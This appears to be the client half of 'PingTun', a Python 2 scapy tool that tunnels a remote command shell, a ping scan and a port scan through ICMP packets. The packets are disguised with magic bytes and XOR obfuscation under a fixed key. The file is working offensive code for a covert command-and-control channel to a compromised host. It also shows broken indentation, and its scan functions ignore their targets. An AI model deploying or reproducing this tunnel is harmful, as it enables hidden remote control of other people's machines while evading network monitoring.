from scapy.all import *
import sys

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

if len(sys.argv) != 3:
	print "[PingTun] Usage: python2 client.py <IP Address> <interface>"
	print "[PingTun] Exiting..."
	exit()

xor = "\x42\x42\x42\x42"

client_magic = "\xde\xad\xbe\xef"
server_magic = "\xbe\xef\xde\xad"

ping= "\xaa\xab\xac\xad"
port = "\xba\xbb\xbc\xbd"
shell = "\xca\xcb\xcc\xcd"

def menu():
	print "[PingTun] Pick a menu option to use: "
	print "[1] Run ping scan."
	print "[2] Run port scan."
	print "[3] Run command shell."
	print "[4] Exit."
	
	choice = raw_input("[PingTun]")
	if choice == "1":
		cider = "[PingTun] Enter IP Range: "
		ping_scan(cider)
	elif choice == "2":
		ip = raw_input("[PingTun] Enter IP to scan: ")
		port_scan(ip)
	elif choice == "3":
		command_shell()
	elif choice == "4":
		print "[PingTun] Exiting..."
		exit()
	else:
		print "[PingTun] Invalid option, please pick a valid number."
	
def action(pkt):
	buff = XOR(pkt.load)
	
        if buff[0:4] == server_magic:
		if buff[4:8] == ping:
                        print "Ping"
                elif buff[4:8] == port:
                        print "Port"
                elif buff[4:8] == shell:
			if len(buff[8:]) > 0:
                        	sys.stdout.write(buff[8:])
    				sys.stdout.flush()
			sendp(packet_builder(shell + raw_input()), verbose=0, iface=sys.argv[2])

def packet_builder(data):
	return Ether() / IP(dst=sys.argv[1]) / ICMP() / (XOR(client_magic + data))

def XOR(p):
	buff = ""
	for i in range(0,len(p)):
		buff += chr(ord(p[i]) ^ ord(xor[i % 4]))
	return buff	

def ping_scan(cider):
	sendp(packet_builder(ping), verbose=0, iface=sys.argv[2])
	menu()

def port_scan(ip):
	sendp(packet_builder(port), verbose=0, iface=sys.argv[2])
        menu()

def command_shell():
	sendp(packet_builder(shell), verbose=0, iface=sys.argv[2])
	sniff(iface=sys.argv[2],filter="icmp",prn=action)
        menu()

menu()
